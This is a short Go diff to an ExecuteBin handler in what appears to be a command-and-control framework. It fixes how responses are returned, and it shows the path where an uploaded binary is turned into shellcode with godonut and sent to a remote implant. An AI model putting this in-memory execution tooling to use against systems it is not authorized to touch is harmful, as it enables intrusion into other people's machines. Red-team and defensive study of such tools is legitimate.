@@ -587,8 +587,6 @@ func ExecuteBin(c *gin.Context) {
 	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + mode + " " + file.Filename + " " + args + "\n"
 	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
 
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
-
 	switch mode {
 	case "execute-assembly":
 		fileLength := len(fileBytes)
@@ -607,6 +605,7 @@ func ExecuteBin(c *gin.Context) {
 		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
 		if err != nil {
 			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Unable to generate shellcode"})
+			return
 		}
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
@@ -627,5 +626,5 @@ func ExecuteBin(c *gin.Context) {
 		byteToSend = append(cmdTypeBytes, byteToSend...)
 		sendcommand.SendCommandBytes(uid, byteToSend)
 	}
-
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 }
